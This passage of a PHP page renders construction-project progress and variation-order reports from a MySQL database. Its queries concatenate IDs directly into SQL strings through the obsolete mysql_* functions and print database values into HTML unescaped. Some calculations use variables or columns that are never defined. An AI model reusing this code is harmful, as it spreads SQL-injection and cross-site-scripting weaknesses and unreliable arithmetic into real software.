$sql2="SELECT sum(vd.vqty) As tvqty, sum(vd.vrate*cc.quantity) as variation_in_rate_amount, sum(vd.vqty*dd.prs) as variation_in_qty_amount,sum(vd.`vamount`) as variation_in_amount,vd.`vo_id`,vd.`contigency_code`,vd.`vono`,vd.`vodate`,vd.`bid`,vd.`remark`,vd.`vstatus`,vd.`bdate`
FROM variationdata vd
LEFT OUTER JOIN (subactivitydata cc) on (vd.sa_id = cc.sa_id) 
LEFT OUTER JOIN (progressdata dd) on (vd.sa_id = dd.sa_id) where cc.sa_id=".$sa_id." GROUP BY cc.sa_id";
$pamountresultp = mysql_query($sql2)or die(mysql_error());
$pgdata=mysql_fetch_array($pamountresultp);
return $pgdata;
}
function getThisMonthSubactivityVariationData($sa_id,$bid)
{ 
 $sql2="SELECT sum(vd.vqty) As lvqty, sum(vd.vrate*cc.quantity) as last_variation_in_rate_amount, sum(vd.vqty*dd.prs) as last_variation_in_qty_amount,sum(vd.`vamount`) as last_variation_in_amount,vd.`vo_id`,vd.`contigency_code`,vd.`vono`,vd.`vodate`,vd.`bid`,vd.`remark`,vd.`vstatus`,vd.`bdate`
FROM variationdata vd
LEFT OUTER JOIN (subactivitydata cc) on (vd.sa_id = cc.sa_id)
LEFT OUTER JOIN (progressdata dd) on (vd.sa_id = dd.sa_id) where cc.sa_id=".$sa_id." AND vd.bid=".$bid." GROUP BY dd.sa_id";
$pamountresultp = mysql_query($sql2)or die(mysql_error());
$pgdata=mysql_fetch_array($pamountresultp);
return $pgdata;
}
function getCode_new($sa_id)
{
 $sql="SELECT code FROM  `subactivity` where sa_id=".$sa_id;
 
$amountresult = mysql_query($sql);
//echo $amountsize= mysql_num_rows($amountresult);
$data=mysql_fetch_array($amountresult);

return $data;
}?>
<!--<tr >
<td colspan="15">
-->

<div class="msg_list" style="display:none">
		<p class="msg_head" style="background-color:#00CC66">View Subactivities <span> <a style="text-decoration:none;color:#ffffff" href="javascript:void(null);" onclick="window.open('print_variation__physical_cont_subactivity_level_report_classification.php?subcomponentid=<?php echo $var_s_id;?>&amp;projectid=<?php echo $projectid;?>&amp;activitytypeid=<?php echo $var_sid;?>&amp;componentid=<?php echo $reportdata['cid'];?>&amp;activityid=<?php echo $var_a_id;?>&amp;subactivityid=<?php echo $reportdata['sa_id'];?>&last_aid=<?php echo $reportdata['aid'];?>','INV','width=1120,height=550,scrollbars=yes');" ><img src="images/popout.gif" border="0" title="pop out"/></a>
        <a style="text-decoration:none;color:#ffffff" href="javascript:void(null);" onclick="window.open('print_variation__physical_cont_subactivity_level_report_summary.php?subcomponentid=<?php echo $var_s_id;?>&amp;projectid=<?php echo $projectid;?>&amp;activitytypeid=<?php echo $var_sid;?>&amp;componentid=<?php echo $reportdata['cid'];?>&amp;activityid=<?php echo $var_a_id;?>&amp;subactivityid=<?php echo $reportdata['sa_id'];?>&last_aid=<?php echo $reportdata['aid'];?>','INV','width=1120,height=550,scrollbars=yes');" >summary</a></span></p>
		<div class="msg_body">
			<table id="tblList" cellpadding="0px" cellspacing="0px"   width="98%" align="center" >

<tr id="tblHeading">
<th rowspan="2"> Sr. No. </th>
<th rowspan="2">Description </th>
<th rowspan="2"> UOM </th>
<!--<th colspan="3">As Per Estimate</th>-->
<th colspan="3"> As Per Bid</th>
<th colspan="2">Paid Upoto Previous </th>
<th colspan="2">During This Month </th>
<th colspan="2">(Executed) Upto Date </th>
<th rowspan="2"> % in Progress</th>
</tr>
<tr id="tblHeading">
<!--<th>Qty. (Units) </th>
<th>Rate </th>
<th> Amount</th>-->
<th>Qty. (Units) </th>
<th>Rate (Rs.) </th>
<th>Amount (Rs.) </th>
<th> Qty. (Units)</th>
<th> Amount(Rs.)</th>
<th> Qty. (Units)</th>
<th> Amount(Rs.)</th>
<th> Qty. (Units)</th>
<th> Amount(Rs.)</th>
</tr>
<?php
$grand_total=0;
$total_month_total=0;
$grand_last_amount=0;
$last_month_act_total=0;
$this_month_act_total=0;
$ph_grand_total=0;
$ph_total_month_total=0;
$ph_last_month_act_total=0;
$ph_this_month_act_total=0;
$ph_vo_total_todate=0;
$ph_vo_grand_total_todate=0;
$ph_vo_lastmonth=0;
$ph_vo_grand_lastmonth=0;
$ph_vo_currentmonth=0;
$ph_vo_grand_currentmonth=0;

$query="SELECT * FROM variation_order where cid=".$reportdata['cid']." GROUP by sa_id";
$reportresult_var = mysql_query($query)or die(mysql_error());
while ($reportdata_var = mysql_fetch_array($reportresult_var)) {
 $reportquerynew ="SELECT  ca.cid,sum(cc.lqty) as lqty, sum(cc.lqty*ca.rates) as lastamount,ca.subactivityname,ca.aid,ca.s_id,ca.sa_id,ca.sid,ca.startdate,ca.units, min(ca.startdate) as mindate, ca.enddate, max(ca.enddate) as maxdate,  ca.quantity, ca.rates, cb.pqty, sum(cb.pqty) as tpqty,sum(ca.quantity*ca.rates) as amount, sum(ca.quantity) as tqty ,sum(cb.pamount)As totalamount,cb.pamount, cb.lbdate as lastdate , cb.prs FROM subactivitydata ca 
LEFT OUTER join (progressdata cb)
on (ca.sa_id = cb.sa_id )
LEFT OUTER join (lastmonthdata cc) 
on (cb.sa_id = cc.sa_id) Where  ca.sa_id=".$reportdata_var['sa_id']." GROUP BY ca.sa_id";

$reportresult_act = mysql_query($reportquerynew)or die(mysql_error());
while ($reportdata_act = mysql_fetch_array($reportresult_act)) {
 $bgcolor = ($bgcolor == "#33CC99") ? "#B7FFDB" : "#33CC99";
/*$bgcolor = ($bgcolor == "#FF9999") ? "#FFD5D5" : "#FF9999";*/
$variation_data_sub=getSubActivityVariationData($reportdata_act['sa_id']);
 if($variation_data_sub['tvqty']>0)
{
$variation_this_data_sub=getThisMonthSubactivityVariationData($reportdata_act['sa_id'],$this_month_bid);
$uptolast_variation=$variation_data_sub['tvqty']-$variation_this_data_sub['lvqty'];
$ph_vo_total_todate=$variation_data_sub["variation_in_qty_amount"]+$variation_data_sub["variation_in_rate_amount"];
$ph_vo_thismonth=$variation_this_data_sub["last_variation_in_qty_amount"]+$variation_this_data_sub["last_variation_in_rate_amount"];
$ph_vo_uptolast=$ph_vo_total_todate-$ph_vo_thismonth;
$total_amount_act=$reportdata_act['amount'];
$this_amount=$reportdata_act['lastamount'];
$grand_this_amount+=$this_amount;
$codeData_new=getCode_new($reportdata_act['sa_id']);
$total_qty=$variation_data_sub['tvqty']+$reportdata_act['tpqty'];
$uptolast_progress_qty=$reportdata_act['tpqty']-$reportdata_act['lqty'];
$total_duringthis_qty=$variation_this_data_sub['lvqty']+$reportdata_act['lqty']; //lqty is during this month qty
$total_uptolast_qty=$uptolast_progress_qty+$uptolast_variation; 
if($variation_data_sub['vrate']==0)
{
$this_month_act=(($reportdata_act['lqty'] + $variation_this_data_sub['lvqty']) * $reportdata_act['prs']);
}
else
{
$this_month_act=(($reportdata_act['lqty'] + $variation_this_data_sub['lvqty']) * $variation_data_sub['vrate']);
}

if($variation_last_data_sub['vrate']==0)
{
$last_month_act=($total_uptolast_qty) * $reportdata_act['prs'];
}
else
{
$last_month_act=($total_uptolast_qty) * $variation_this_data_sub['vrate'];
}

if($variation_data_sub['vrate']==0)
{
$total_month=($total_qty) * $reportdata_act['prs'];
}
else
{
$total_month=($total_qty) * $variation_data_sub['vrate'];
}

?>
<?php /*if($variation_data_sub['tvqty']>0)
{*/

$ph_vo_grand_total_todate+=$ph_vo_total_todate;
$ph_vo_grand_lastmonth+=$ph_vo_uptolast;
$ph_vo_grand_currentmonth+=$ph_vo_thismonth;
$grand_total+=$total_amount_act;
$total_month_total+=$total_month;
$last_month_act_total+=$last_month_act;
$this_month_act_total+=$this_month_act;?>
<tr style="background-color:<?php echo $bgcolor;?>;">
<td style="text-align:center;"><?php echo  $codeData_new['code']; ?></td>
<td style="text-align:left;"><?php   echo $reportdata_act['subactivityname']; ?></td>
<td style="text-align:center;"><?php echo $reportdata_act['units']; ?></td>
<?php /*?><td style="text-align:center;"><?php echo number_format($reportdata['quantity'],2); ?></td>
<td style="text-align:right;"><?php  echo number_format($reportdata['rates'],2); ?></td>
<td style="text-align:right;"><?php  echo number_format (($reportdata['quantity'] * $reportdata['rates']),2) ; ?></td><?php */?>
<td style="text-align:center;"><?php echo number_format($reportdata_act['tqty'],2); ?></td>
<td style="text-align:right;"><?php  echo number_format($reportdata_act['rates'],2); ?></td>
<td style="text-align:right;"><?php  echo number_format (($reportdata_act['tqty'] * $reportdata_act['rates']),2) ; ?></td>
<td style="text-align:center;"><?php echo number_format ($total_last_qty,2); ?></td>
<td style="text-align:right;"><?php  echo number_format (($last_month_act),2) ; ?></td>
<td style="text-align:center;"><?php echo number_format ($total_qty - $total_last_qty,2); ?></td>
<td style="text-align:right;"><?php  echo number_format($this_month_act,2) ; ?></td>
<td style="text-align:center;"><?php echo number_format ($total_qty,2); ?></td>   
<td style="text-align:right;"><?php  echo number_format (($total_month),2) ; ?></td>
<td style="text-align:right;"><?php  if($reportdata_act['tpqty']!=0 && $reportdata_act['tqty']!=0)
{
echo number_format((($total_qty / $reportdata_act['tqty'])*100),2);
}
else
{
echo "0.0";
} ?></td>
</tr>
<?php //}?>
<?php
}
}
}
?>
<tr align="right" id="grand_total">
<td style="text-align:right;" colspan="5"><strong><?php echo  "Grand Total:"; ?></strong></td>
<?php /*?><td style="text-align:center;"><?php echo number_format ($grand_total,2); ?></td>
<td style="text-align:right;">&nbsp;</td>
<td style="text-align:right;">&nbsp;</td><?php */?>
<td style="text-align:right;"><?php  
echo number_format ($grand_total,2); ?></td>
<td style="text-align:center;">&nbsp;</td>
<td style="text-align:right;"><?php  echo number_format (($this_month_act_total),2) ; ?></td>
<td style="text-align:center;">&nbsp;</td>
<td style="text-align:right;"><?php  echo  number_format ($last_month_act_total,2) ; ?></td>
<td style="text-align:center;">&nbsp;</td>   
<td style="text-align:right;"><?php  echo  number_format ($total_month_total,2) ; ?></td>
<td style="text-align:right;"><?php  if($total_month_total!=0&&$grand_total!=0)
{
echo number_format((($total_month_total/$grand_total)*100),2);
}
else
{
echo "0.0";
} ?></td>
</tr>
</table>
		</div>	
		
</div>

<!--</td>
</tr>-->
<?php 
 if($vo_grand_total_todate!=0)
{
$ph_contigency_total=$vo_grand_total_todate;
$ph_contigency_thismonth=$vo_total_thismonth;
$ph_contigency_lastmonth=$vo_total_uptolast;
$to_date_progress= $to_date_progress+$vo_grand_total_todate;
$upto_last_month_progress=$upto_last_month_progress+$vo_total_uptolast;
$during_this_month_progress=$during_this_month_progress+$vo_total_thismonth;
$physical_contigency=$to_date_progress;
}
$physical_contigency=$physical_contigency/$reportdata['amount']*100;
} ?>
<?php if($physical_contigency!=0)
{
$actual_progress=$physical_contigency;
echo  number_format (($actual_progress),2); 
$physical_contigency=0;
}
else
{
echo  number_format ($actual_progress,2); 

}
$actual_uptolast=$upto_last_month_progress+$vo_uptolast;
$total_actual_uptolast+=$actual_uptolast;
$actual_current=$during_this_month_progress+$vo_thismonth;
$total_actual_current+=$actual_current;
$actual_total=$actual_uptolast+$actual_current;
$grand_actual_total+=$actual_total;
//echo $actual_total;?></td>
<td style="text-align:right;"> <?php
									if($reportdata['sid']==3|| $reportdata['sid']==4)
									{
									 if($physical_contigency!=0)          /////////////////for physical contigency////
									{
									if($reportdata['sid']==4)
									{
									$CWeightData=getComponentWeight1(3,$reportdata['cid']);
									}
									
									$weighted_progress=($CWeightData['c_weight']/100)*($weight)*($physical_contigency/100);
									
									echo number_format ($weighted_progress,2);
									$grand_total_weighted_progress+=$weighted_progress;
									$total_weighted_progress+=$weighted_progress;
									$pre_total_weighted_progress=$total_weighted_progress;
									}
									else
									{
									if($reportdata['sid']==4)
									{
									$CWeightData=getComponentWeight1(3,$reportdata['cid']);
									}
									
									$weighted_progress=($CWeightData['c_weight']/100)*($weight)*($actual_progress/100);
									
									echo number_format ($weighted_progress,2);
									$grand_total_weighted_progress+=$weighted_progress;
									$total_weighted_progress+=$weighted_progress;
									$pre_total_weighted_progress=$total_weighted_progress;
									}                         ///////////////////for remaining items
									}
									else
									{
                                     
									$weighted_progress=$CWeightData['c_weight']*($activity_weight/100)*($actual_progress/100);
									
									echo number_format ($weighted_progress,2);
									//$grand_total_weighted_progress+=$weighted_progress;
									$total_weighted_progress+=$weighted_progress;
									$pre_total_weighted_progress=$total_weighted_progress;
									}?></td>
</tr>

<?php
$prev=$reportdata['s_id'];
$prev1=$reportdata['sid'];
}
?>
<tr align="right" id="sub_title">
<td align="left">&nbsp;</td>
<td align="left">&nbsp;</td>

<td align="right">
  <strong><?php echo  $StructureName;?> &nbsp;Sub Total:</strong></td>
<td align="right"><strong><?php 
$size=0;
$sql="SELECT * FROM subcomponents where cid=".$componentid." AND (sid=3 OR sid=4) ";
 $result = mysql_query($sql);
 $size= mysql_num_rows($result);
 if($size==0)
 {
 if($componentid==13)
 {
 $WeightSumData=getWeightSum($componentid,6);
 $ComponentWeightSum=$WeightSumData["component_weighted_sum"];
 echo number_format($ComponentWeightSum,2);
 }
 else
 {
 $WeightSumData=getWeightSum($componentid,1);
 $ComponentWeightSum=$WeightSumData["component_weighted_sum"];
 echo number_format($ComponentWeightSum,2);
 }
 }
 else
 {
$WeightSumData=getWeightSum($componentid,3);
$ComponentWeightSum=$WeightSumData["component_weighted_sum"];
echo number_format($totalweight*$ComponentWeightSum/100,2);
}
 ?></strong></td>
<?php /*?><!--<td align="right"><?php echo number_format($ComponentWeightSum,2);?></td>--><?php */?>
<td align="right">
<?php /*?><?php $sub_total_actual_progress=($total_weighted_progress/$totalweight*100);
echo  number_format($sub_total_actual_progress,2);
?><?php */?><strong>
<?php

$CWeightData=getComponentWeight1(3,$componentid); 
if($CWeightData['c_weight']!=0)
echo number_format (($total_weighted_progress/$CWeightData['c_weight']*100),2);
else echo "0.0"; ?></strong></td>
<td align="right">
<strong><?php echo  number_format($total_weighted_progress,2);
?></strong></td>
</tr>
<tr align="right" id="sub_title">
<td align="left">&nbsp;</td>
<td align="left">&nbsp;</td>

<td align="right">
  <strong><?php echo "Construction";?> &nbsp;Total:</strong></td>
<td align="right"><strong><?php 
$size=0;
$sql="SELECT * FROM subcomponents where cid=".$componentid." AND (sid=3 OR sid=4) ";
 $result = mysql_query($sql);
 $size= mysql_num_rows($result);
 if($size==0)
 {
 if($componentid==13)
 {
 $WeightSumData=getWeightSum($componentid,6);
 $ComponentWeightSum=$WeightSumData["component_weighted_sum"];
 echo number_format($ComponentWeightSum,2);
 }
 else
 {
 $WeightSumData=getWeightSum($componentid,1);
 $ComponentWeightSum=$WeightSumData["component_weighted_sum"];
 echo number_format($ComponentWeightSum,2);
 }
 }
 else
 {
	 $w2=0;
	 $w_p=0;
$WeightSumData1=getWeightSum($componentid,3);
$WeightSumData2=getWeightSum($componentid,2);
$ComponentWeightSum1=$WeightSumData1["component_weighted_sum"];
$w1=$totalweight*$ComponentWeightSum1/100;
$w2=$w1+$WeightSumData2["component_weighted_sum"];
echo number_format($w1+$WeightSumData2["component_weighted_sum"],2);
}
 ?></strong></td>
<?php /*?><!--<td align="right"><?php echo number_format($ComponentWeightSum,2);?></td>--><?php */?>
<td align="right">
<?php /*?><?php $sub_total_actual_progress=($total_weighted_progress/$totalweight*100);
echo  number_format($sub_total_actual_progress,2);
?><?php */?>
<?php
$CWeightData=getComponentWeight1(3,$componentid); 
 $w2= number_format($w2,2);
$w_p=$total_weighted_progress+$mob_weighted_progress;
?><strong><?php if($w2!=0)
echo number_format (($w_p/$w2*100),2); 
else
echo number_format (0,2);?></strong></td>
<td align="right">
<strong><?php echo  number_format($total_weighted_progress+$mob_weighted_progress,2);
?></strong></td>
</tr>
<tr align="right" id="grand_total">
<td colspan="3" align="right">
<strong>Grand Total:</strong></td>
<td align="right"><strong><?php 
$WeightSumDataTotal=getWeightSumTotal($componentid);
$ComponentWeightSumTotal=$WeightSumDataTotal["component_weighted_sum"];
echo number_format($ComponentWeightSumTotal,2);?></strong></td>
<?php /*?><!--<td align="right"><?php echo number_format($grand_total,2);?></td>--><?php */?>
<td align="right">
<?php //echo  number_format(($total_progress/$grand_total*100),2);?></td>
<td align="right">
<strong><?php $size=0;
$sql="SELECT * FROM subcomponents where cid=".$componentid." AND (sid=3 OR sid=4) ";
 $result = mysql_query($sql);
 $size= mysql_num_rows($result);
 if($size==0)
 {
 echo  number_format($total_weighted_progress,2);
 }
 else
 {
 echo  number_format($grand_total_weighted_progress,2);
 }?>
 </strong>
 </td>
</tr>

<tr align="center" >
<td colspan="6" style="border:0"><span class="printlink"><a href="javascript:void(null);" onclick="window.print();" style="float:right">Print</a></span></td>
</tr>
</table>
</div>